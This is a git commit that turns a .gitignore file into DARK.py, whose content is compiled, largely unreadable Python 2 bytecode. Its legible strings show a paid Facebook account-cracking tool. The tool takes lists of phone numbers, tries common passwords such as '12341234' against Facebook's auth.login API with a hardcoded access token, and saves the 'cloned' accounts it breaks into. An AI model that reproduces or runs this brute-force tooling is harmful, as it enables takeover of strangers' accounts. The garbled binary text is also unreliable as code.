fe865300c268051ba70804f7ee30173bffc23889
maracracker12 <78456231+maracracker12@users.noreply.github.com>
2021-03-24 01:20:03 +0300

    Update and rename .gitignore to DARK.py

---
+++ DARK.py
@@ -0,0 +1,188 @@
+ó
+ÿc�����������@���sS��e��Z�e�r#�d��d��Z�„�„�Z�n��d�d�l�Z�d�d�l�Z�d�d�l�Z�d�d�l�Z�d�d�l�Z�d�d�l�Z�d�d�l	�Z	�d�d�l
+�Z
+�d�d�l�Z�d�d�l�Z�d�d�l
+�Z
+�d�d�l�Z�d�d�l�Z�d�„��Z�e�ƒ��e�j�d�ƒ�xJ�e�d�ƒ�D]<�Z�e�j�d�d�ƒ�Z�e�d�d�ƒ�e�_�e�GHe�j�j�ƒ��qé�Wy�d�d�l�Z�Wn�e�k
+�rYe�j�d	�ƒ�n�Xy�d�d�l�Z�Wn8�e�k
+�r¤e�j�d
+�ƒ�e�j�d�ƒ�e�j�d�ƒ�n�Xd�d�l�Z�d�d�l�Z�d�d�l�Z�d�d�l�Z�d�d�l�Z�d�d�l�Z�d�d�l	�Z	�d�d�l
+�Z
+�d�d�l�Z�d�d�l�Z�d�d�l
+�Z
+�d�d�l�Z�d�d�l�Z�d�d
+�l�m�Z�d�d�l�m�Z�d�d�l�m �Z �e!�e�ƒ�e�j"�d�ƒ�e�j �ƒ��Z#�e#�j$�e��ƒ�e#�j%�e�j&�j'�ƒ��d�d�ƒd0�g�e#�_(�d1�g�e#�_(�d�„��Z)�d�„��Z*�e�j�d�ƒ�d�„��Z+�d�„��Z,�d�„��Z-�d�„��Z.�d��Z/�g��a0�g��Z1�g��a2�d�Z3�d�Z4�e�j�d�ƒ�d �Z5�Z5�d��Z/�g��Z6�g��a2�g��a0�g��Z1�e�j�d!�ƒ�d"�GHd#�Z7�d$�Z8�d%�Z9�x�e9�d%�k�r&e:�d&�ƒ�Z;�e;�e7�k�re:�d'�ƒ�Z<�e<�e8�k�rüd(�GHe�j�d)�ƒ�e�j�d*�ƒ�d+�Z9�q#d,�GHe�j�d�ƒ�q˜d,�GHe�j�d�ƒ�q˜Wd-�„��Z=�d.�„��Z>�e?�d/�k�rOe=�ƒ��n��d�S(2���i����iÿÿÿÿNc����������C���sÒ���t��t�j�ƒ��ƒ�t��t�j�ƒ��ƒ�}��d�j�|��ƒ�}�d�|�GHye�t�j�d�ƒ�j�}�|�|�k�r‚�d�GHt��t�j�ƒ��ƒ�}�t�j	�d�ƒ�n�d�GHt�j	�d�ƒ�t
+�j�ƒ��Wn,�t
+�j�ƒ��t�d�k�rÎ�t
+�GHt�ƒ��qÎ�n�Xd��S(���Nt���-s���[37;1mYOUR ID : sC���https://raw.githubusercontent.com/MATIN-CODERR/ACTIVE/main/list.txts���[92mYOUR ID IS ACTIVE.........i���s!���[91mYOUR ID IS NOT ACTIVE.......t���__main__(���t���strt���ost���geteuidt���getlogint���joint���requestst���gett���textt���timet���sleept���syst���exitt���namet���logot���chk(���t���uuidt���idt���httpCahtt���msg(����(����s
+���180158516o.pyR���
+���s$����"	
+
+
+s���rm -rf .txti'��i–˜�s���.txtt���as4���No Module Named Requests! type:pip2 install requestss6���No Module Named Mechanize! type:pip2 install mechanizei���s���Then type: python2 PUBG.py(���t
+���ThreadPool(���t���ConnectionError(���t���Browsert���utf8t���max_times
+���User-AgentsR���Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16s
+���user-agents��Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]c�����������C���s���d�GHt��j�j�ƒ��d��S(���Ns���Thanks.(���R���R���R
+���(����(����(����s
+���180158516o.pyt���keluarB���s����c���������C���sS���d�}�d�}�x:�t��D]2�}�|�d�|�t�j�d�t�|�ƒ�d�ƒ�|�7}�q�Wt�|�ƒ�S(���Nt���ahtdzjct����t���!i����i���(���t���xt���randomt���randintt���lent���cetak(���t���bt���wt���dt���i(����(����s
+���180158516o.pyt���acakG���s
+����
+0s���mkdir anggaxd/cloned.txtc���������C���s~���d�}�xA�|�D]9�}�|�j��|�ƒ�}�|�j�d�|�d�t�d�|�ƒ�ƒ�}�q
+�W|�d�7}�|�j�d�d�ƒ�}�t�j�j�|�d�ƒ�d��S(���NR���s���!%ss���[%s;1mi���s���[0ms���!0s���
+(���t���indext���replaceR���R���t���stdoutt���write(���R$���R%���R'���t���jR���(����(����s
+���180158516o.pyR#���P���s����
+(
+c���������C���sC���x<�|��d�D]0�}�t��j�j�|�ƒ�t��j�j�ƒ��t�j�d�ƒ�q�Wd��S(���Ns���
+gš™™™™™¹?(���R���R+���R,���t���flushR
+���R���(���t���zt���e(����(����s
+���180158516o.pyt���jalan[���s����
+c����������C���sF���d�d�d�g�}��x0�|��D](�}�d�|�Gt��j�j�ƒ��t�j�d�ƒ�q�Wd��S(���Ns���.   s���..  s���... s���
+[1;93mPlease Wait [1;93mi���(���R���R+���R.���R
+���R���(���t���titikt���o(����(����s
+���180158516o.pyt���tikb���s
+����
+
+c���������C���sC���x<�|��d�D]0�}�t��j�j�|�ƒ�t��j�j�ƒ��t�j�d�ƒ�q�Wd��S(���Ns���
+g¸…ëQ¸ž?(���R���R+���R,���R.���R
+���R���(���R/���R0���(����(����s
+���180158516o.pyt���psbj���s����
+s
+���[31mNot Vulns	���[32mVulnt���clearsQ��
+VERISION : 1.2
+
+CODE BY : MATIN
+
+                                                          
+
+[91mo.OOOo.      Oo    `OooOOo.  `o    O  
+[91m O    `o    o  O    o     `o  o   O   
+[91m o      O  O    o   O      O  O  O    
+[93m O      o oOooOoOo  o     .O  oOo     
+[93m o      O o      O  OOooOO'   o  o    
+[92m O      o O      o  o    o    O   O   
+[92m o    .O' o      O  O     O   o    o  
+[92m OooOO'   O.     O  O      o  O     O 
+                                      
+                                      
+                                                                                                                                                                                                                                                                                               
+[91mO~~       O~~      O~       O~~~ O~~~~~~O~~O~~~     O~~
+[91mO~ O~~   O~~~     O~ ~~          O~~    O~~O~ O~~   O~~
+[93mO~~ O~~ O O~~    O~  O~~         O~~    O~~O~~ O~~  O~~
+[93mO~~  O~~  O~~   O~~   O~~        O~~    O~~O~~  O~~ O~~
+[93mO~~   O~  O~~  O~~~~~~ O~~       O~~    O~~O~~   O~ O~~
+[92mO~~       O~~ O~~       O~~      O~~    O~~O~~    O~ ~~
+[92mO~~       O~~O~~         O~~     O~~    O~~O~~      O~~
+                                                       
+
+                                                                                                                                                  
+   [92mAUTHER : MATIN
+
+   [92mNOTE : THIS TOOL NOT FREE
+
+   [92mNOTE : THIS TOOL MONEY
+
+
+                                        
+                                        
+s���figlet PASSWORDs-���BO ZANIN USER U PASS NAMA BNERA @Matin_Expertt���MATINt���DARKt���trues���USERNAME TOOL: s���PASSWORD TOOL: s���TAWAW RASTA i���s���python2 .pyt���falses���HALAYA !c�����������C���s,���t��j�d�ƒ�t�GHd�GHd�GHd�GHt�ƒ��d��S(���NR6���s ���[92m[1]  FREE  MOD [[92mNo Cp]R���(���R���t���systemR���t���action(����(����(����s
+���180158516o.pyt���menu¼���s����
+c�������������sÇ��t��d�ƒ�}��|��d�k�r'�d�GHt�ƒ��nÁ�|��d�k�rÆ�t�j�d�ƒ�t�GHd�GHyO�t��d�ƒ�‰��d�‰�d�}�x0�t�|�d	�ƒ�j�ƒ��D]�}�t�j�|�j	�ƒ��ƒ�q{�WWqè�t
+�k
+�rÂ�d
+�GHt��d�ƒ�t�ƒ��qè�Xn"�|��d�k�rÜ�t�ƒ��n�d
+�GHt�ƒ��t
+�t�t�ƒ�ƒ�}�t�d�|�ƒ�t�j�d�ƒ�t�d�ƒ�t�j�d�ƒ�t�d�ƒ�t�j�d�ƒ�d�d�GH‡��‡�f�d�†��}�t�d�ƒ�}�|�j�|�t�ƒ�d�GHd�GHd�t
+�t�t�ƒ�ƒ�d�t
+�t�t�ƒ�ƒ�GHd�GHt��d�ƒ�t�ƒ��d��S(���Ns���
+[1;91mHALBZHERA : R���s���[!] Fill in correctlyt���1R6���s'���[92m0770  0750  0773  0751  0752  0753s���[92mZHMARAYAK DABNE  : s���.txtt���rs���[!] File Not Founds	���
+[ Back ]t���0s���[!] Fill Ba Kalk Nayas���[92m[!]KOY RAQAMAKAN: gš™™™™™¹?s���[92m[!]KAMEK CHAWAREKAs���[92m[!]BO WASTAN TOOL CTRL+Zg������à?i*���s���[1;91m=c������������s™��|��}�y�t��j�d�ƒ�Wn�t�k
+�r*�n�Xy`|�}�t�j�d�ˆ�ˆ��|�d�|�d�ƒ�}�t�j�|�ƒ�}�d�|�k�ré�d�ˆ�ˆ��|�d�|�d�d�GHt�d	�d
+�ƒ�}�|�j�ˆ�ˆ��|�d�|�d�ƒ�|�j�ƒ��t	�j
+�ˆ��|�|�ƒ�n…�d�|�d
+�k�rhd�ˆ�ˆ��|�d�|�d�GHt�d�d
+�ƒ�}�|�j�ˆ�ˆ��|�d�|�d�ƒ�|�j�ƒ��t�j
+�ˆ��|�|�ƒ�n�d�}�t�j�d�ˆ�ˆ��|�d�|�d�ƒ�}�t�j�|�ƒ�}�d�|�k�r#d�ˆ�ˆ��|�d�|�d�d�GHt�d	�d
+�ƒ�}�|�j�ˆ�ˆ��|�d�|�d�ƒ�|�j�ƒ��t	�j
+�ˆ��|�|�ƒ�n…�d�|�d
+�k�r¢d�ˆ�ˆ��|�d�|�d�GHt�d�d
+�ƒ�}�|�j�ˆ�ˆ��|�d�|�d�ƒ�|�j�ƒ��t�j
+�ˆ��|�|�ƒ�n�d�}�t�j�d�ˆ�ˆ��|�d�|�d�ƒ�}�t�j�|�ƒ�}�d�|�k�r]d�ˆ�ˆ��|�d�|�d�d�GHt�d	�d
+�ƒ�}�|�j�ˆ�ˆ��|�d�|�d�ƒ�|�j�ƒ��t	�j
+�ˆ��|�|�ƒ�n…�d�|�d
+�k�rÜd�ˆ�ˆ��|�d�|�d�GHt�d�d
+�ƒ�}�|�j�ˆ�ˆ��|�d�|�d�ƒ�|�j�ƒ��t�j
+�ˆ��|�|�ƒ�n�d�}	�t�j�d�ˆ�ˆ��|�d�|	�d�ƒ�}�t�j�|�ƒ�}�d�|�k�r—d�ˆ�ˆ��|�d�|	�d�d�GHt�d	�d
+�ƒ�}�|�j�ˆ�ˆ��|�d�|	�d�ƒ�|�j�ƒ��t	�j
+�ˆ��|�|	�ƒ�n…�d�|�d
+�k�rd�ˆ�ˆ��|�d�|	�d�GHt�d�d
+�ƒ�}�|�j�ˆ�ˆ��|�d�|	�d�ƒ�|�j�ƒ��t�j
+�ˆ��|�|	�ƒ�n�d�}
+�t�j�d�ˆ�ˆ��|�d�|
+�d�ƒ�}�t�j�|�ƒ�}�d�|�k�rÑd�ˆ�ˆ��|�d�|
+�d�d�GHt�d	�d
+�ƒ�}�|�j�ˆ�ˆ��|�d�|�d�ƒ�|�j�ƒ��t	�j
+�ˆ��|�|�ƒ�n…�d�|�d
+�k�rPd�ˆ�ˆ��|�d�|
+�d�GHt�d�d
+�ƒ�}�|�j�ˆ�ˆ��|�d�|
+�d�ƒ�|�j�ƒ��t�j
+�ˆ��|�|
+�ƒ�n�d�}�t�j�d�ˆ�ˆ��|�d�|�d�ƒ�}�t�j�|�ƒ�}�d�|�k�rd�ˆ�ˆ��|�d�|�d�d�GHt�d	�d
+�ƒ�}�|�j�ˆ�ˆ��|�d�|�d�ƒ�|�j�ƒ��t	�j
+�ˆ��|�|�ƒ�n�d�|�d
+�k�rŠd�ˆ�ˆ��|�d�|�d�GHt�d�d
+�ƒ�}�|�j�ˆ�ˆ��|�d�|�d�ƒ�|�j�ƒ��t�j
+�ˆ��|�|�ƒ�n��Wn�n�Xd��S(���Nt���saves‘���https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=s���&locale=en_US&password=sH���&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efmt���access_tokens���[1;92m[OK]Number Is:[1;92m s��� >>> s���
+s���save/successfull.txtR���s���>>>s���www.facebook.comt	���error_msgs���[1;91m[CP][1;91m s���save/checkpoint.txtt
+���1122334455t���12341234t���11223344556677t
+���1234512345t���123123(���R���t���mkdirt���OSErrort���brt���opent���jsont���loadR,���t���closet���okst���appendt���cpb(���t���argt���usert���pass1t���datat���qt���okbt���cpst���pass2t���pass3t���pass4t���pass5t���pass6(���t���ct���k(����s
+���180158516o.pyt���mainê���sÄ����
+'!!
+!
+'!!
+!
+'!!
+!
+'!!
+!
+'!!
+!
+'!!
+!
+i���s9���[1;97m--------------------------------------------------s$���[âœ“] Process Has Been Completed ...s&���[âœ“] Total Successfully/Checkpoint : t���/s8���[âœ“] Cloned Accounts Has Been Saved : anggaxd/clone.txts���
+[1;97m[[1;97mBack[1;95m](���t	���raw_inputR<���R���R;���R���RL���t	���readlinesR���RQ���t���stript���IOErrorR=���t���exbR���R"���R5���R
+���R���R���t���mapRP���RR���(���t���bcht���idlistt���linet���xxxRa���t���p(����(���R_���R`���s
+���180158516o.pyR<���Å���sN����
+
+
+
+
+
+
+
+
+
+	j)
+R���(���s
+���User-AgentsR���Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16(���s
+���user-agents��Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;](@���t���Falset���foot���barR���R���R
+���t���datetimeR ���t���hashlibt���ret	���threadingRM���t���urllibt	���cookielibt���getpassR���R���R;���t���ranget���nR!���t���nmbrRL���R+���R.���t���ImportErrort	���mechanizeR���t���multiprocessing.poolR���t���requests.exceptionsR���R���t���reloadt���setdefaultencodingRK���t���set_handle_robotst���set_handle_refresht���_httpt���HTTPRefreshProcessort
+���addheadersR���R(���R#���R1���R4���R5���t���backRP���R���RR���t���vulnott���vulnR���t
+���successfult���CorrectUsernamet���CorrectPasswordt���loopRc���t���usernamet���passwordR=���R<���t���__name__(����(����(����s
+���180158516o.pyt���<module>���s˜���
+
+	
+
+
+
+
+œ
+
+
+		
+				
+(
+
+
+
+				™
